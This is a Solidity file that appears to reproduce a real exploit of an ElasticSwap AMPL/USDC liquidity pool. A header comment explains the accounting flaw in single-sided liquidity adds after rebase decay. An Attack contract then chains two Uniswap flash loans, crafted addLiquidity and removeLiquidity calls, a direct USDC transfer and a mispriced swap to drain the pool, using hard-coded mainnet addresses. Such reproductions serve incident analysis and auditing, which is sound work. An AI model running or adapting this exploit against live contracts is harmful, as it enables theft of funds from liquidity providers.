// SPDX-License-Identifier: UNLICENSED


/*
    ATTACK TX HASH: 0xb36486f032a450782d5d2fac118ea90a6d3b08cac3409d949c59b43bcd6dbb8f

    EXPLOIT CONDITIONS
    - There must be sufficient Alpha or Beta decay present
      - A rebase had happened an hour before attack: https://etherscan.io/tx/0xba13f722ea52cf1d71be077e263a0cbde3f270f80781b44994d347324ae86d1d
    - When there is sufficient decay you are able to do a one-sided add to liqudiity
      - When you do this single-sided liquidity add it doesn't increase the internalBalances.baseTokenReserveQty storage variable
    - MathLib.sol L575-579
      - When it flips it around it multiplies quoteTknQuantityDesired which is zero and then divides resulting in still  zero
      - This zero value is then checked to be more than the baseTokenQtyMin argument in the addLiquidity function
      - But that argument can also be set to zero so you can pass this check
      - Then that zero value will be "added" to the internalBalances.baseTokenReserveQty value, effectively leaving it unchanged
      - Congrats, you now have balance on the contract that has not been taken into account
      - Wait when you add liquidity for second time it's taken into account
      - Maybe attacker actually needed to just correct pricing after rebase before attacking? Or was rebase part of condition?

    - You then add liquidity as normal following the liquidity ratio that currently exists on-chain
      - But you still have that liquidity added before that hasn't been tracked

    
    - Vuln is L207-212

*/


pragma solidity ^0.8.13;

import "forge-std/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@v2-core/contracts/interfaces/IUniswapV2Callee.sol";

interface MathLib {
    struct InternalBalances {
        uint256 baseTokenReserveQty;
        uint256 quoteTokenReserveQty;
        uint256 kLast;
    }
}

interface ElasticSwap {

    function internalBalances() external view returns (MathLib.InternalBalances memory);

    function addLiquidity(
        uint256 _baseTokenQtyDesired,
        uint256 _quoteTokenQtyDesired,
        uint256 _baseTokenQtyMin,
        uint256 _quoteTokenQtyMin,
        address _liquidityTokenRecipient,
        uint256 _expirationTimestamp
    ) external;

    function removeLiquidity(
        uint256 _liquidityTokenQty,
        uint256 _baseTokenQtyMin,
        uint256 _quoteTokenQtyMin,
        address _tokenRecipient,
        uint256 _expirationTimestamp
    ) external;

    function swapQuoteTokenForBaseToken(
        uint256 _quoteTokenQty,
        uint256 _minBaseTokenQty,
        uint256 _expirationTimestamp
    ) external;
}

contract Attack is IUniswapV2Callee {

    address constant private ampl = 0xD46bA6D942050d489DBd938a2C909A5d5039A161;
    address constant private usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    address constant private AMPL_WETH_pool = 0xc5be99A02C6857f9Eac67BbCE58DF5572498F40c;
    address constant private USDC_USDT_pool = 0x3041CbD36888bECc7bbCBc0045E3B1f144466f5f;

    address constant private AMPL_USDC_pool = 0xa0c5aA50cE3cc69b1c478d8235597bC0c51DfDAb;

    function attack() external returns (bool) {
        // Borrow AMPL
        bytes memory flashloandata = new bytes(1);
        flashloandata[0] = 0x11;
        IUniswapV2Pair(AMPL_WETH_pool).swap(0, 940_000_000_000_000, address(this), flashloandata);
        return true;
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        // Since we do two flashloans need to choose correct behavior depending on `data` argument
        if(data[0] == 0x11) {
            // Borrow USDC
            bytes memory flashloandata = new bytes(1);
            flashloandata[0] = 0x22;
            IUniswapV2Pair(USDC_USDT_pool).swap(2_900_000_000_000, 0, address(this), flashloandata);                       
        } 
        else if(data[0] == 0x22) {
            // Exploit
            exploit();
        }
    }

    function exploit() internal {
        // Approve max for AMPL and USDC
        IERC20(ampl).approve(AMPL_USDC_pool, type(uint256).max);
        IERC20(usdc).approve(AMPL_USDC_pool, type(uint256).max);

        console.log("ampl before after exploit:  ", IERC20(ampl).balanceOf(address(this)));
        console.log("usdc before after exploit:  ", IERC20(usdc).balanceOf(address(this)));

        // Current ratio:
        // 347616080868225 AMPL vs 527279223993 USDC
        // Ratio: 659:1

        // Second deposit ratio:
        // 164204588455430 AMPL vs 249072677422 USDC
        // Ratio: 659:1
        // Deposit got:     10691121837278 LP

        // Solo deposit vs transfer ratio:
        // 183277868919506 AMPL vs 776350901415 USDC
        // Ratio: 236:1 ???
        // Solo deposit got  5966445134104 LP 


        MathLib.InternalBalances memory ib;
        ib = ElasticSwap(AMPL_USDC_pool).internalBalances();
        
        // THERE IS SUFFICIENT DECAY PRESENT
        /*
        console.log(isSufficientDecayPresent(IERC20(ampl).balanceOf(AMPL_USDC_pool), ib));

        
        console.log(ib.baseTokenReserveQty);
        console.log(ib.quoteTokenReserveQty);
        */

        // Deposit
        // @NOTE You can combine both these liq adds such that you only need one liq add where the AMPL in amount is the sum of both separate ones but USDC can stay same
        ElasticSwap(AMPL_USDC_pool).addLiquidity(183277868919506, 0, 0, 0, address(this), 1000000000000);

        /*
        ib = ElasticSwap(AMPL_USDC_pool).internalBalances();
        console.log(ib.baseTokenReserveQty);
        console.log(ib.quoteTokenReserveQty);
        */

        ElasticSwap(AMPL_USDC_pool).addLiquidity(164204588455430, 249072677422, 0, 0, address(this), 1000000000000);

        /*
        ib = ElasticSwap(AMPL_USDC_pool).internalBalances();
        console.log(ib.baseTokenReserveQty);
        console.log(ib.quoteTokenReserveQty);
        */

        // Transfer
        IERC20(usdc).transfer(AMPL_USDC_pool, 776350901415);

        // Withdraw

        ElasticSwap(AMPL_USDC_pool).removeLiquidity(IERC20(AMPL_USDC_pool).balanceOf(address(this)), 1, 1, address(this), 1000000000000);


        /*
        ib = ElasticSwap(AMPL_USDC_pool).internalBalances();
        console.log(ib.baseTokenReserveQty);
        console.log(ib.quoteTokenReserveQty);
        */

        ib = ElasticSwap(AMPL_USDC_pool).internalBalances();
        console.log("quote token reserve: ", ib.quoteTokenReserveQty);

        // Now that pricing is messed up where quote tokens are worth lots compared to base token we swap quote for base
        ElasticSwap(AMPL_USDC_pool).swapQuoteTokenForBaseToken(ib.quoteTokenReserveQty * 100, 1, 1000000000000);

        ElasticSwap(AMPL_USDC_pool).addLiquidity(IERC20(ampl).balanceOf(address(this)), IERC20(usdc).balanceOf(address(this)), 0, 0, address(this), 1000000000000);

        ElasticSwap(AMPL_USDC_pool).removeLiquidity(IERC20(AMPL_USDC_pool).balanceOf(address(this)), 1, 1, address(this), 1000000000000);

        console.log("ampl balance after exploit: ", IERC20(ampl).balanceOf(address(this)));
        console.log("usdc balance after exploit: ", IERC20(usdc).balanceOf(address(this)));

        console.log("deposit successful");
    }

































    // FUNCTIONS FOR JUST TESTING THAT THERE IS SUFFICIENT DECAY

    function isSufficientDecayPresent(
        uint256 _baseTokenReserveQty,
        MathLib.InternalBalances memory _internalBalances
    ) public pure returns (bool) {
        return (wDiv(
            diff(_baseTokenReserveQty, _internalBalances.baseTokenReserveQty) *
                WAD,
            wDiv(
                _internalBalances.baseTokenReserveQty,
                _internalBalances.quoteTokenReserveQty
            )
        ) >= WAD); // the amount of base token (a) decay is greater than 1 unit of quote token (token b)
    }
    
    uint256 public constant WAD = 1e18; // represent a decimal with 18 digits of precision

    /**
     * @dev divides two float values, required since solidity does not handle
     * floating point values.
     *
     * inspiration: https://github.com/dapphub/ds-math/blob/master/src/math.sol
     *
     * NOTE: this rounds to the nearest integer (up or down). For example .666666 would end up
     * rounding to .66667.
     *
     * @return uint256 wad value (decimal with 18 digits of precision)
     */
    function wDiv(uint256 a, uint256 b) public pure returns (uint256) {
        return ((a * WAD) + (b / 2)) / b;
    }

    /**
     * @dev rounds a integer (a) to the nearest n places.
     * IE roundToNearest(123, 10) would round to the nearest 10th place (120).
     */
    function roundToNearest(uint256 a, uint256 n)
        public
        pure
        returns (uint256)
    {
        return ((a + (n / 2)) / n) * n;
    }

    /**
     * @dev multiplies two float values, required since solidity does not handle
     * floating point values
     *
     * inspiration: https://github.com/dapphub/ds-math/blob/master/src/math.sol
     *
     * @return uint256 wad value (decimal with 18 digits of precision)
     */
    function wMul(uint256 a, uint256 b) public pure returns (uint256) {
        return ((a * b) + (WAD / 2)) / WAD;
    }

    /**
     * @dev calculates an absolute diff between two integers. Basically the solidity
     * equivalent of Math.abs(a-b);
     */
    function diff(uint256 a, uint256 b) public pure returns (uint256) {
        if (a >= b) {
            return a - b;
        }
        return b - a;
    }


}